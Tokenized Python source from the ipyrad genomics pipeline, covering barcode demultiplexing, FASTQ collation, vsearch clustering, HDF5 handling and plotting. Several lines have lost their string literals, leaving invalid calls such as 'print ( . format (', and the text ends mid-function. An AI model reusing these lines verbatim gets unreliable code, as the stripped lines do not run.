def collate_files ( data , sname , tmp1s , tmp2s ) : ## out handle out1 = os . path . join ( data . dirs . fastqs , "{}_R1_.fastq.gz" . format ( sname ) ) out = io . BufferedWriter ( gzip . open ( out1 , 'w' ) ) ## build cmd cmd1 = [ 'cat' ] for tmpfile in tmp1s : cmd1 += [ tmpfile ] ## compression function proc = sps . Popen ( [ 'which' , 'pigz' ] , stderr = sps . PIPE , stdout = sps . PIPE ) . communicate ( ) if proc [ 0 ] . strip ( ) : compress = [ "pigz" ] else : compress = [ "gzip" ] ## call cmd proc1 = sps . Popen ( cmd1 , stderr = sps . PIPE , stdout = sps . PIPE ) proc2 = sps . Popen ( compress , stdin = proc1 . stdout , stderr = sps . PIPE , stdout = out ) err = proc2 . communicate ( ) if proc2 . returncode : raise IPyradWarningExit ( "error in collate_files R1 %s" , err ) proc1 . stdout . close ( ) out . close ( ) ## then cleanup for tmpfile in tmp1s : os . remove ( tmpfile ) if 'pair' in data . paramsdict [ "datatype" ] : ## out handle out2 = os . path . join ( data . dirs . fastqs , "{}_R2_.fastq.gz" . format ( sname ) ) out = io . BufferedWriter ( gzip . open ( out2 , 'w' ) ) ## build cmd cmd1 = [ 'cat' ] for tmpfile in tmp2s : cmd1 += [ tmpfile ] ## call cmd proc1 = sps . Popen ( cmd1 , stderr = sps . PIPE , stdout = sps . PIPE ) proc2 = sps . Popen ( compress , stdin = proc1 . stdout , stderr = sps . PIPE , stdout = out ) err = proc2 . communicate ( ) if proc2 . returncode : raise IPyradWarningExit ( "error in collate_files R2 %s" , err ) proc1 . stdout . close ( ) out . close ( ) ## then cleanup for tmpfile in tmp2s : os . remove ( tmpfile )
def inverse_barcodes ( data ) : matchdict = { } bases = set ( "CATGN" ) poss = set ( ) ## do perfect matches for sname , barc in data . barcodes . items ( ) : ## remove -technical-replicate-N if present if "-technical-replicate-" in sname : sname = sname . rsplit ( "-technical-replicate" , 1 ) [ 0 ] matchdict [ barc ] = sname poss . add ( barc ) if data . paramsdict [ "max_barcode_mismatch" ] > 0 : ## get 1-base diffs for idx1 , base in enumerate ( barc ) : diffs = bases . difference ( base ) for diff in diffs : lbar = list ( barc ) lbar [ idx1 ] = diff tbar1 = "" . join ( lbar ) if tbar1 not in poss : matchdict [ tbar1 ] = sname poss . add ( tbar1 ) else : if matchdict . get ( tbar1 ) != sname : print ( . format ( sname , barc , matchdict [ tbar1 ] , data . barcodes [ matchdict [ tbar1 ] ] , data . paramsdict [ "max_barcode_mismatch" ] ) ) ## if allowing two base difference things get big ## for each modified bar, allow one modification to other bases if data . paramsdict [ "max_barcode_mismatch" ] > 1 : for idx2 , _ in enumerate ( tbar1 ) : ## skip the base that is already modified if idx2 != idx1 : for diff in bases . difference ( tbar1 [ idx2 ] ) : ltbar = list ( tbar1 ) ltbar [ idx2 ] = diff tbar2 = "" . join ( ltbar ) if tbar2 not in poss : matchdict [ tbar2 ] = sname poss . add ( tbar2 ) else : if matchdict . get ( tbar2 ) != sname : print ( . format ( sname , barc , matchdict [ tbar2 ] , data . barcodes [ matchdict [ tbar2 ] ] , data . paramsdict [ "max_barcode_mismatch" ] ) ) return matchdict
def _cleanup_and_die ( data ) : tmpfiles = glob . glob ( os . path . join ( data . dirs . fastqs , "tmp_*_R*.fastq" ) ) tmpfiles += glob . glob ( os . path . join ( data . dirs . fastqs , "tmp_*.p" ) ) for tmpf in tmpfiles : os . remove ( tmpf )
def splitfiles ( data , raws , ipyclient ) : ## create a tmpdir for chunked_files and a chunk optimizer  tmpdir = os . path . join ( data . paramsdict [ "project_dir" ] , "tmp-chunks-" + data . name ) if os . path . exists ( tmpdir ) : shutil . rmtree ( tmpdir ) os . makedirs ( tmpdir ) ## chunk into 8M reads totalreads = estimate_optim ( data , raws [ 0 ] [ 0 ] , ipyclient ) optim = int ( 8e6 ) njobs = int ( totalreads / ( optim / 4. ) ) * len ( raws ) ## if more files than cpus: no chunking nosplit = 0 if ( len ( raws ) > len ( ipyclient ) ) or ( totalreads < optim ) : nosplit = 1 ## send slices N at a time. The dict chunkfiles stores a tuple of rawpairs ## dictionary to store asyncresults for sorting jobs start = time . time ( ) chunkfiles = { } for fidx , tups in enumerate ( raws ) : handle = os . path . splitext ( os . path . basename ( tups [ 0 ] ) ) [ 0 ] ## if number of lines is > 20M then just submit it if nosplit : chunkfiles [ handle ] = [ tups ] else : ## chunk the file using zcat_make_temps chunklist = zcat_make_temps ( data , tups , fidx , tmpdir , optim , njobs , start ) chunkfiles [ handle ] = chunklist if not nosplit : print ( "" ) return chunkfiles
def demux ( data , chunkfiles , cutters , longbar , matchdict , ipyclient ) : ## parallel stuff start = time . time ( ) printstr = ' sorting reads         | {} | s1 |' lbview = ipyclient . load_balanced_view ( ) ## store statcounters and async results in dicts perfile = { } filesort = { } for handle , rawtuplist in chunkfiles . items ( ) : ## get args for job for fidx , rawtuple in enumerate ( rawtuplist ) : #handle = os.path.splitext(os.path.basename(rawtuple[0]))[0] args = ( data , rawtuple , cutters , longbar , matchdict , fidx ) ## submit the job filesort [ handle ] = lbview . apply ( barmatch , * args ) ## get ready to receive stats: 'total', 'cutfound', 'matched' perfile [ handle ] = np . zeros ( 3 , dtype = np . int ) ## stats for each sample fdbars = { } fsamplehits = Counter ( ) fbarhits = Counter ( ) fmisses = Counter ( ) ## a tuple to hold my dictionaries statdicts = perfile , fsamplehits , fbarhits , fmisses , fdbars try : kbd = 0 total = len ( chunkfiles ) done = 0 ## wait for jobs to finish while 1 : fin = [ i for i , j in filesort . items ( ) if j . ready ( ) ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( total , done , printstr . format ( elapsed ) , spacer = data . _spacer ) time . sleep ( 0.1 ) ## should we break? if total == done : print ( "" ) break ## cleanup for job in fin : if filesort [ job ] . successful ( ) : pfile = filesort [ job ] . result ( ) #if result: if pfile : ## check if this needs to return data putstats ( pfile , handle , statdicts ) ## purge to conserve memory del filesort [ job ] done += 1 ## keep tacking progreess during writing stage start = time . time ( ) printstr = ' writing/compressing   | {} | s1 |' elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( 10 , 0 , printstr . format ( elapsed ) , spacer = data . _spacer ) except KeyboardInterrupt : ## wait to cleanup kbd = 1 raise ## only proceed here if barmatch jobs were not interrupted else : ## collate files and do progress bar ftmps = glob . glob ( os . path . join ( data . dirs . fastqs , "tmp_*.fastq" ) ) ## a dict to assign tmp files to names/reads r1dict = { } r2dict = { } for sname in data . barcodes : r1dict [ sname ] = [ ] r2dict [ sname ] = [ ] ## assign to name keys for ftmp in ftmps : ## split names base , orient , _ = ftmp . rsplit ( "_" , 2 ) sname = base . rsplit ( "/" , 1 ) [ - 1 ] . split ( "tmp_" , 1 ) [ 1 ] ## put into dicts if orient == "R1" : r1dict [ sname ] . append ( ftmp ) else : r2dict [ sname ] . append ( ftmp ) ## concatenate files total = len ( data . barcodes ) done = 0 ## store asyncs of collate jobs writers = [ ] for sname in data . barcodes : tmp1s = sorted ( r1dict [ sname ] ) tmp2s = sorted ( r2dict [ sname ] ) writers . append ( lbview . apply ( collate_files , * [ data , sname , tmp1s , tmp2s ] ) ) ## track progress of collate jobs while 1 : ready = [ i . ready ( ) for i in writers ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) progressbar ( total , sum ( ready ) , printstr . format ( elapsed ) , spacer = data . _spacer ) time . sleep ( 0.1 ) if all ( ready ) : print ( "" ) break finally : ## clean up junk files tmpfiles = glob . glob ( os . path . join ( data . dirs . fastqs , "tmp_*_R*.fastq" ) ) tmpfiles += glob . glob ( os . path . join ( data . dirs . fastqs , "tmp_*.p" ) ) for tmpf in tmpfiles : os . remove ( tmpf ) if kbd : raise KeyboardInterrupt ( ) else : ## build stats from dictionaries perfile , fsamplehits , fbarhits , fmisses , fdbars = statdicts make_stats ( data , perfile , fsamplehits , fbarhits , fmisses , fdbars )
def putstats ( pfile , handle , statdicts ) : ## load in stats with open ( pfile , 'r' ) as infile : filestats , samplestats = pickle . load ( infile ) ## get dicts from statdicts tuple perfile , fsamplehits , fbarhits , fmisses , fdbars = statdicts ## pull new stats #handle = os.path.splitext(os.path.basename(handle))[0] perfile [ handle ] += filestats ## update sample stats samplehits , barhits , misses , dbars = samplestats fsamplehits . update ( samplehits ) fbarhits . update ( barhits ) fmisses . update ( misses ) fdbars . update ( dbars ) ## repack the tuple and return statdicts = perfile , fsamplehits , fbarhits , fmisses , fdbars return statdicts
def _plotshare ( share , names , * * kwargs ) : ## set the colormap colormap = toyplot . color . LinearMap ( toyplot . color . brewer . palette ( "Spectral" ) , domain_min = share . min ( ) , domain_max = share . max ( ) ) ## set up canvas if not kwargs . get ( 'width' ) : width = 900 else : width = kwargs [ 'width' ] canvas = toyplot . Canvas ( width = width , height = width * 0.77778 ) ## order the dta table = canvas . matrix ( ( share , colormap ) , bounds = ( 50 , canvas . height - 100 , 50 , canvas . height - 100 ) , step = 5 , tshow = False , lshow = False ) ## put a box around the table table . body . grid . vlines [ ... , [ 0 , - 1 ] ] = 'single' table . body . grid . hlines [ [ 0 , - 1 ] , ... ] = 'single' ## make hover info on grid for i , j in itertools . product ( range ( len ( share ) ) , repeat = 2 ) : table . body . cell ( i , j ) . title = "%s, %s : %s" % ( names [ i ] , names [ j ] , int ( share [ i , j ] ) ) ## create barplot axes = canvas . cartesian ( bounds = ( 665 , 800 , 90 , 560 ) ) ## make a hover for barplot zf = zip ( names [ : : - 1 ] , share . diagonal ( ) [ : : - 1 ] ) barfloater = [ "%s: %s" % ( i , int ( j ) ) for i , j in zf ] ## plot bars axes . bars ( share . diagonal ( ) [ : : - 1 ] , along = 'y' , title = barfloater ) ## hide spine, move labels to the left,  ## use taxon names, rotate angle, align axes . y . spine . show = False axes . y . ticks . labels . offset = 0 axes . y . ticks . locator = toyplot . locator . Explicit ( range ( len ( names ) ) , labels = names [ : : - 1 ] ) axes . y . ticks . labels . angle = - 90 axes . y . ticks . labels . style = { "baseline-shift" : 0 , "text-anchor" : "end" , "font-size" : "8px" } ## rotate xlabels, align with ticks, change to thousands, move up on canvas ## show ticks, and hide popup coordinates axes . x . ticks . labels . angle = 90 axes . x . ticks . labels . offset = 20 axes . x . ticks . locator = toyplot . locator . Explicit ( range ( 0 , int ( share . max ( ) ) , int ( share . max ( ) / 10 ) ) , [ "{}" . format ( i ) for i in range ( 0 , int ( share . max ( ) ) , int ( share . max ( ) / 10 ) ) ] ) axes . x . ticks . labels . style = { "baseline-shift" : 0 , "text-anchor" : "end" , "-toyplot-anchor-shift" : "15px" } axes . x . ticks . show = True ## add labels label_style = { "font-size" : "16px" , "font-weight" : "bold" } canvas . text ( 300 , 60 , "Matrix of shared RAD loci" , style = label_style ) canvas . text ( 700 , 60 , "N RAD loci per sample" , style = label_style ) return canvas , axes
def _countmatrix ( lxs ) : ## an empty matrix share = np . zeros ( ( lxs . shape [ 0 ] , lxs . shape [ 0 ] ) ) ## fill above names = range ( lxs . shape [ 0 ] ) for row in lxs : for samp1 , samp2 in itertools . combinations ( names , 2 ) : shared = lxs [ samp1 , lxs [ samp2 ] > 0 ] . sum ( ) share [ samp1 , samp2 ] = shared ## mirror below ##share[] ## fill diagonal with total sample coverage for row in xrange ( len ( names ) ) : share [ row , row ] = lxs [ row ] . sum ( ) return share
def paramname ( param = "" ) : try : name = pinfo [ str ( param ) ] [ 0 ] . strip ( ) . split ( " " ) [ 1 ] except ( KeyError , ValueError ) as err : ## TODO: paramsinfo get description by param string not working. ## It would be cool to have an assembly object bcz then you could ## just do this: ## ## print(pinfo[data.paramsinfo.keys().index(param)]) print ( "\tKey name/number not recognized - " . format ( param ) , err ) raise return name
def save_json2 ( data ) : ## convert everything to dicts ## skip _ipcluster cuz it's made new. datadict = OrderedDict ( [ ( "outfiles" , data . __dict__ [ "outfiles" ] ) , ( "stats_files" , dict ( data . __dict__ [ "stats_files" ] ) ) , ( "stats_dfs" , data . __dict__ [ "stats_dfs" ] ) ] )
def save_json ( data ) : ## data as dict #### skip _ipcluster because it's made new #### skip _headers because it's loaded new #### statsfiles save only keys #### samples save only keys datadict = OrderedDict ( [ ( "_version" , data . __dict__ [ "_version" ] ) , ( "_checkpoint" , data . __dict__ [ "_checkpoint" ] ) , ( "name" , data . __dict__ [ "name" ] ) , ( "dirs" , data . __dict__ [ "dirs" ] ) , ( "paramsdict" , data . __dict__ [ "paramsdict" ] ) , ( "samples" , data . __dict__ [ "samples" ] . keys ( ) ) , ( "populations" , data . __dict__ [ "populations" ] ) , ( "database" , data . __dict__ [ "database" ] ) , ( "clust_database" , data . __dict__ [ "clust_database" ] ) , ( "outfiles" , data . __dict__ [ "outfiles" ] ) , ( "barcodes" , data . __dict__ [ "barcodes" ] ) , ( "stats_files" , data . __dict__ [ "stats_files" ] ) , ( "_hackersonly" , data . __dict__ [ "_hackersonly" ] ) , ] ) ## sample dict sampledict = OrderedDict ( [ ] ) for key , sample in data . samples . iteritems ( ) : sampledict [ key ] = sample . _to_fulldict ( ) ## json format it using cumstom Encoder class fulldumps = json . dumps ( { "assembly" : datadict , "samples" : sampledict } , cls = Encoder , sort_keys = False , indent = 4 , separators = ( "," , ":" ) , ) ## save to file assemblypath = os . path . join ( data . dirs . project , data . name + ".json" ) if not os . path . exists ( data . dirs . project ) : os . mkdir ( data . dirs . project ) ## protect save from interruption done = 0 while not done : try : with open ( assemblypath , 'w' ) as jout : jout . write ( fulldumps ) done = 1 except ( KeyboardInterrupt , SystemExit ) : print ( '.' ) continue
def encode ( self , obj ) : def hint_tuples ( item ) : """ embeds __tuple__ hinter in json strings """ if isinstance ( item , tuple ) : return { '__tuple__' : True , 'items' : item } if isinstance ( item , list ) : return [ hint_tuples ( e ) for e in item ] if isinstance ( item , dict ) : return { key : hint_tuples ( val ) for key , val in item . iteritems ( ) } else : return item return super ( Encoder , self ) . encode ( hint_tuples ( obj ) )
def depthplot ( data , samples = None , dims = ( None , None ) , canvas = ( None , None ) , xmax = 50 , log = False , outprefix = None , use_maxdepth = False ) : ## select samples to be plotted, requires depths info if not samples : samples = data . samples . keys ( ) samples . sort ( ) subsamples = OrderedDict ( [ ( i , data . samples [ i ] ) for i in samples ] ) ## get canvas dimensions based on n-samples if any ( dims ) : ## user-supplied dimensions (...) print ( "userdims" ) else : if len ( subsamples ) <= 4 : ## set dimension to N samples  dims = ( 1 , len ( subsamples ) ) else : dims = ( len ( subsamples ) / 4 , 4 ) ## create canvas if any ( canvas ) : print ( "usercanvas" ) canvas = toyplot . Canvas ( width = canvas [ 0 ] , height = canvas [ 1 ] ) else : canvas = toyplot . Canvas ( width = 200 * dims [ 1 ] , height = 150 * dims [ 0 ] ) ## get all of the data arrays for panel , sample in enumerate ( subsamples ) : ## statistical called bins statdat = subsamples [ sample ] . depths statdat = statdat [ statdat >= data . paramsdict [ "mindepth_statistical" ] ] if use_maxdepth : statdat = { i : j for ( i , j ) in statdat if i < data . paramsdict [ "maxdepth" ] } sdat = np . histogram ( statdat , range ( 50 ) ) ## majrule called bins statdat = subsamples [ sample ] . depths statdat = statdat [ statdat < data . paramsdict [ "mindepth_statistical" ] ] statdat = statdat [ statdat >= data . paramsdict [ "mindepth_majrule" ] ] if use_maxdepth : statdat = statdat [ statdat < data . paramsdict [ "maxdepth" ] ] mdat = np . histogram ( statdat , range ( 50 ) ) ## excluded bins tots = data . samples [ sample ] . depths tots = tots [ tots < data . paramsdict [ "mindepth_majrule" ] ] if use_maxdepth : tots = tots [ tots < data . paramsdict [ "maxdepth" ] ] edat = np . histogram ( tots , range ( 50 ) ) ## fill in each panel of canvas with a sample axes = canvas . cartesian ( grid = ( dims [ 0 ] , dims [ 1 ] , panel ) , gutter = 25 ) axes . x . domain . xmax = xmax axes . label . text = sample if log : axes . y . scale = "log" # heights = np.column_stack((sdat,mdat,edat)) axes . bars ( sdat ) axes . bars ( edat ) axes . bars ( mdat ) ## return objects to be saved... if outprefix : toyplot . html . render ( canvas , fobj = outprefix + ".html" ) toyplot . svg . render ( canvas , fobj = outprefix + ".svg" )
def _parse_00 ( ofile ) : with open ( ofile ) as infile : ## read in the results summary from the end of the outfile arr = np . array ( [ " " ] + infile . read ( ) . split ( "Summary of MCMC results\n\n\n" ) [ 1 : ] [ 0 ] . strip ( ) . split ( ) ) ## reshape array  rows = 12 cols = ( arr . shape [ 0 ] + 1 ) / rows arr = arr . reshape ( rows , cols ) ## make into labeled data frame df = pd . DataFrame ( data = arr [ 1 : , 1 : ] , columns = arr [ 0 , 1 : ] , index = arr [ 1 : , 0 ] , ) . T return df
def _parse_01 ( ofiles , individual = False ) : ## parse results from outfiles cols = [ ] dats = [ ] for ofile in ofiles : ## parse file with open ( ofile ) as infile : dat = infile . read ( ) lastbits = dat . split ( ".mcmc.txt\n\n" ) [ 1 : ] results = lastbits [ 0 ] . split ( "\n\n" ) [ 0 ] . split ( ) ## get shape from ... shape = ( ( ( len ( results ) - 3 ) / 4 ) , 4 ) dat = np . array ( results [ 3 : ] ) . reshape ( shape ) cols . append ( dat [ : , 3 ] . astype ( float ) ) if not individual : ## get mean results across reps cols = np . array ( cols ) cols = cols . sum ( axis = 0 ) / len ( ofiles ) #10. dat [ : , 3 ] = cols . astype ( str ) ## format as a DF df = pd . DataFrame ( dat [ : , 1 : ] ) df . columns = [ "delim" , "prior" , "posterior" ] nspecies = 1 + np . array ( [ list ( i ) for i in dat [ : , 1 ] ] , dtype = int ) . sum ( axis = 1 ) df [ "nspecies" ] = nspecies return df else : ## get mean results across reps #return cols res = [ ] for i in xrange ( len ( cols ) ) : x = dat x [ : , 3 ] = cols [ i ] . astype ( str ) x = pd . DataFrame ( x [ : , 1 : ] ) x . columns = [ 'delim' , 'prior' , 'posterior' ] nspecies = 1 + np . array ( [ list ( i ) for i in dat [ : , 1 ] ] , dtype = int ) . sum ( axis = 1 ) x [ "nspecies" ] = nspecies res . append ( x ) return res
def _write_ctlfile ( self ) : #, rep=None): ## A string to store ctl info ctl = [ ] ## write the top header info ctl . append ( "seed = {}" . format ( self . params . seed ) ) ctl . append ( "seqfile = {}" . format ( self . seqfile ) ) ctl . append ( "Imapfile = {}" . format ( self . mapfile ) ) path = os . path . realpath ( os . path . join ( self . workdir , self . _name ) ) mcmcfile = "{}.mcmc.txt" . format ( path ) outfile = "{}.out.txt" . format ( path ) if mcmcfile not in self . files . mcmcfiles : self . files . mcmcfiles . append ( mcmcfile ) if outfile not in self . files . outfiles : self . files . outfiles . append ( outfile ) ctl . append ( "mcmcfile = {}" . format ( mcmcfile ) ) ctl . append ( "outfile = {}" . format ( outfile ) ) ## number of loci (checks that seq file exists and parses from there) ctl . append ( "nloci = {}" . format ( self . _nloci ) ) ctl . append ( "usedata = {}" . format ( self . params . usedata ) ) ctl . append ( "cleandata = {}" . format ( self . params . cleandata ) ) ## infer species tree if self . params . infer_sptree : ctl . append ( "speciestree = 1 0.4 0.2 0.1" ) else : ctl . append ( "speciestree = 0" ) ## infer delimitation (with algorithm 1 by default) ctl . append ( "speciesdelimitation = {} {} {}" . format ( self . params . infer_delimit , self . params . delimit_alg [ 0 ] , " " . join ( [ str ( i ) for i in self . params . delimit_alg [ 1 : ] ] ) ) ) ## get tree values nspecies = str ( len ( self . imap ) ) species = " " . join ( sorted ( self . imap ) ) ninds = " " . join ( [ str ( len ( self . imap [ i ] ) ) for i in sorted ( self . imap ) ] ) ctl . append ( SPECIESTREE . format ( nspecies , species , ninds , self . tree . write ( format = 9 ) ) ) ## priors ctl . append ( "thetaprior = {} {}" . format ( * self . params . thetaprior ) ) ctl . append ( "tauprior = {} {} {}" . format ( * self . params . tauprior ) ) ## other values, fixed for now ctl . append ( "finetune = 1: {}" . format ( " " . join ( [ str ( i ) for i in self . params . finetune ] ) ) ) #CTL.append("finetune = 1: 1 0.002 0.01 0.01 0.02 0.005 1.0") ctl . append ( "print = 1 0 0 0" ) ctl . append ( "burnin = {}" . format ( self . params . burnin ) ) ctl . append ( "sampfreq = {}" . format ( self . params . sampfreq ) ) ctl . append ( "nsample = {}" . format ( self . params . nsample ) ) ## write out the ctl file ctlhandle = os . path . realpath ( "{}.ctl.txt" . format ( os . path . join ( self . workdir , self . _name ) ) ) # if isinstance(rep, int): #     ctlhandle = os.path.realpath( #         "{}-r{}.ctl.txt".format(os.path.join(self.workdir, self._name), rep)) # else: #     ctlhandle = os.path.realpath( #         "{}.ctl.txt".format(os.path.join(self.workdir, self._name))) with open ( ctlhandle , 'w' ) as out : out . write ( "\n" . join ( ctl ) ) return ctlhandle
def concatclusts ( outhandle , alignbits ) : with gzip . open ( outhandle , 'wb' ) as out : for fname in alignbits : with open ( fname ) as infile : out . write ( infile . read ( ) + "//\n//\n" )
def cluster ( data , noreverse , nthreads ) : ## input and output file handles cathaplos = os . path . join ( data . dirs . across , data . name + "_catshuf.tmp" ) uhaplos = os . path . join ( data . dirs . across , data . name + ".utemp" ) hhaplos = os . path . join ( data . dirs . across , data . name + ".htemp" ) logfile = os . path . join ( data . dirs . across , "s6_cluster_stats.txt" ) ## parameters that vary by datatype ## (too low of cov values yield too many poor alignments) strand = "plus" cov = 0.75 ##0.90 if data . paramsdict [ "datatype" ] in [ "gbs" , "2brad" ] : strand = "both" cov = 0.60 elif data . paramsdict [ "datatype" ] == "pairgbs" : strand = "both" cov = 0.75 ##0.90 ## nthreads is calculated in 'call_cluster()' cmd = [ ipyrad . bins . vsearch , "-cluster_smallmem" , cathaplos , "-strand" , strand , "-query_cov" , str ( cov ) , "-minsl" , str ( 0.5 ) , "-id" , str ( data . paramsdict [ "clust_threshold" ] ) , "-userout" , uhaplos , "-notmatched" , hhaplos , "-userfields" , "query+target+qstrand" , "-maxaccepts" , "1" , "-maxrejects" , "0" , "-fasta_width" , "0" , "-threads" , str ( nthreads ) , #"0", "-fulldp" , "-usersort" , "-log" , logfile ] ## override reverse clustering option if noreverse : strand = "plus" # -leftjust " try : ## this seems to start vsearch on a different pid than the engine ## and so it's hard to kill...  LOGGER . info ( cmd ) ( dog , owner ) = pty . openpty ( ) proc = sps . Popen ( cmd , stdout = owner , stderr = owner , close_fds = True ) prog = 0 newprog = 0 while 1 : isdat = select . select ( [ dog ] , [ ] , [ ] , 0 ) if isdat [ 0 ] : dat = os . read ( dog , 80192 ) else : dat = "" if "Clustering" in dat : try : newprog = int ( dat . split ( ) [ - 1 ] [ : - 1 ] ) ## may raise value error when it gets to the end except ValueError : pass ## break if done ## catches end chunk of printing if clustering went really fast elif "Clusters:" in dat : LOGGER . info ( "ended vsearch tracking loop" ) break else : time . sleep ( 0.1 ) ## print progress if newprog != prog : print ( newprog ) prog = newprog ## another catcher to let vsearch cleanup after clustering is done proc . wait ( ) print ( 100 ) except KeyboardInterrupt : LOGGER . info ( "interrupted vsearch here: %s" , proc . pid ) os . kill ( proc . pid , 2 ) raise KeyboardInterrupt ( ) except sps . CalledProcessError as inst : raise IPyradWarningExit ( . format ( inst , sps . STDOUT ) ) except OSError as inst : raise IPyradWarningExit ( . format ( inst ) ) finally : data . stats_files . s6 = logfile
def fill_dups_arr ( data ) : ## build the duplicates array duplefiles = glob . glob ( os . path . join ( data . tmpdir , "duples_*.tmp.npy" ) ) duplefiles . sort ( key = lambda x : int ( x . rsplit ( "_" , 1 ) [ - 1 ] [ : - 8 ] ) ) ## enter the duplicates filter into super h5 array io5 = h5py . File ( data . clust_database , 'r+' ) dfilter = io5 [ "duplicates" ] ## enter all duple arrays into full duplicates array init = 0 for dupf in duplefiles : end = int ( dupf . rsplit ( "_" , 1 ) [ - 1 ] [ : - 8 ] ) inarr = np . load ( dupf ) dfilter [ init : end ] = inarr init += end - init #os.remove(dupf) #del inarr ## continued progress bar LOGGER . info ( "all duplicates: %s" , dfilter [ : ] . sum ( ) ) io5 . close ( )
def build_tmp_h5 ( data , samples ) : ## get samples and names, sorted snames = [ i . name for i in samples ] snames . sort ( ) ## Build an array for quickly indexing consens reads from catg files. ## save as a npy int binary file. uhandle = os . path . join ( data . dirs . across , data . name + ".utemp.sort" ) bseeds = os . path . join ( data . dirs . across , data . name + ".tmparrs.h5" ) ## send as first async1 job get_seeds_and_hits ( uhandle , bseeds , snames )
def get_nloci ( data ) : bseeds = os . path . join ( data . dirs . across , data . name + ".tmparrs.h5" ) with h5py . File ( bseeds ) as io5 : return io5 [ "seedsarr" ] . shape [ 0 ]
def write_to_fullarr ( data , sample , sidx ) : ## enter ref data? #isref = 'reference' in data.paramsdict["assembly_method"] LOGGER . info ( "writing fullarr %s %s" , sample . name , sidx ) ## save big arrays to disk temporarily with h5py . File ( data . clust_database , 'r+' ) as io5 : ## open views into the arrays we plan to fill chunk = io5 [ "catgs" ] . attrs [ "chunksize" ] [ 0 ] catg = io5 [ "catgs" ] nall = io5 [ "nalleles" ] ## adding an axis to newcatg makes it write about 1000X faster. smpio = os . path . join ( data . dirs . across , sample . name + '.tmp.h5' ) with h5py . File ( smpio ) as indat : ## grab all of the data from this sample's arrays newcatg = indat [ "icatg" ] #[:] onall = indat [ "inall" ] #[:] ## enter it into the full array one chunk at a time for cidx in xrange ( 0 , catg . shape [ 0 ] , chunk ) : end = cidx + chunk catg [ cidx : end , sidx : sidx + 1 , : ] = np . expand_dims ( newcatg [ cidx : end , : ] , axis = 1 ) nall [ : , sidx : sidx + 1 ] = np . expand_dims ( onall , axis = 1 )
def dask_chroms ( data , samples ) : ## example concatenating with dask h5s = [ os . path . join ( data . dirs . across , s . name + ".tmp.h5" ) for s in samples ] handles = [ h5py . File ( i ) for i in h5s ] dsets = [ i [ '/ichrom' ] for i in handles ] arrays = [ da . from_array ( dset , chunks = ( 10000 , 3 ) ) for dset in dsets ] stack = da . stack ( arrays , axis = 2 ) ## max chrom (should we check for variable hits? if so, things can get wonk) maxchrom = da . max ( stack , axis = 2 ) [ : , 0 ] ## max pos maxpos = da . max ( stack , axis = 2 ) [ : , 2 ] ## min pos mask = stack == 0 stack [ mask ] = 9223372036854775807 ## max int64 value minpos = da . min ( stack , axis = 2 ) [ : , 1 ] final = da . stack ( [ maxchrom , minpos , maxpos ] , axis = 1 ) final . to_hdf5 ( data . clust_database , "/chroms" ) ## close the h5 handles _ = [ i . close ( ) for i in handles ]
def inserted_indels ( indels , ocatg ) : ## return copy with indels inserted newcatg = np . zeros ( ocatg . shape , dtype = np . uint32 ) ## iterate over loci and make extensions for indels for iloc in xrange ( ocatg . shape [ 0 ] ) : ## get indels indices indidx = np . where ( indels [ iloc , : ] ) [ 0 ] if np . any ( indidx ) : ## which new (empty) rows will be added allrows = np . arange ( ocatg . shape [ 1 ] ) mask = np . ones ( allrows . shape [ 0 ] , dtype = np . bool_ ) for idx in indidx : mask [ idx ] = False not_idx = allrows [ mask == 1 ] ## fill in new data into all other spots newcatg [ iloc ] [ not_idx ] = ocatg [ iloc , : not_idx . shape [ 0 ] ] else : newcatg [ iloc ] = ocatg [ iloc ] return newcatg
def count_seeds ( usort ) : with open ( usort , 'r' ) as insort : cmd1 = [ "cut" , "-f" , "2" ] cmd2 = [ "uniq" ] cmd3 = [ "wc" ] proc1 = sps . Popen ( cmd1 , stdin = insort , stdout = sps . PIPE , close_fds = True ) proc2 = sps . Popen ( cmd2 , stdin = proc1 . stdout , stdout = sps . PIPE , close_fds = True ) proc3 = sps . Popen ( cmd3 , stdin = proc2 . stdout , stdout = sps . PIPE , close_fds = True ) res = proc3 . communicate ( ) nseeds = int ( res [ 0 ] . split ( ) [ 0 ] ) proc1 . stdout . close ( ) proc2 . stdout . close ( ) proc3 . stdout . close ( ) return nseeds
def sort_seeds ( uhandle , usort ) : cmd = [ "sort" , "-k" , "2" , uhandle , "-o" , usort ] proc = sps . Popen ( cmd , close_fds = True ) proc . communicate ( )
def assembly_cleanup ( data ) : ## build s2 results data frame data . stats_dfs . s2 = data . _build_stat ( "s2" ) data . stats_files . s2 = os . path . join ( data . dirs . edits , 's2_rawedit_stats.txt' ) ## write stats for all samples with io . open ( data . stats_files . s2 , 'w' , encoding = 'utf-8' ) as outfile : data . stats_dfs . s2 . fillna ( value = 0 ) . astype ( np . int ) . to_string ( outfile )
def parse_single_results ( data , sample , res1 ) : ## set default values  #sample.stats_dfs.s2["reads_raw"] = 0 sample . stats_dfs . s2 [ "trim_adapter_bp_read1" ] = 0 sample . stats_dfs . s2 [ "trim_quality_bp_read1" ] = 0 sample . stats_dfs . s2 [ "reads_filtered_by_Ns" ] = 0 sample . stats_dfs . s2 [ "reads_filtered_by_minlen" ] = 0 sample . stats_dfs . s2 [ "reads_passed_filter" ] = 0 ## parse new values from cutadapt results output lines = res1 . strip ( ) . split ( "\n" ) for line in lines : if "Total reads processed:" in line : value = int ( line . split ( ) [ 3 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_raw" ] = value if "Reads with adapters:" in line : value = int ( line . split ( ) [ 3 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "trim_adapter_bp_read1" ] = value if "Quality-trimmed" in line : value = int ( line . split ( ) [ 1 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "trim_quality_bp_read1" ] = value if "Reads that were too short" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_filtered_by_minlen" ] = value if "Reads with too many N" in line : value = int ( line . split ( ) [ 5 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_filtered_by_Ns" ] = value if "Reads written (passing filters):" in line : value = int ( line . split ( ) [ 4 ] . replace ( "," , "" ) ) sample . stats_dfs . s2 [ "reads_passed_filter" ] = value ## save to stats summary if sample . stats_dfs . s2 . reads_passed_filter : sample . stats . state = 2 sample . stats . reads_passed_filter = sample . stats_dfs . s2 . reads_passed_filter sample . files . edits = [ ( OPJ ( data . dirs . edits , sample . name + 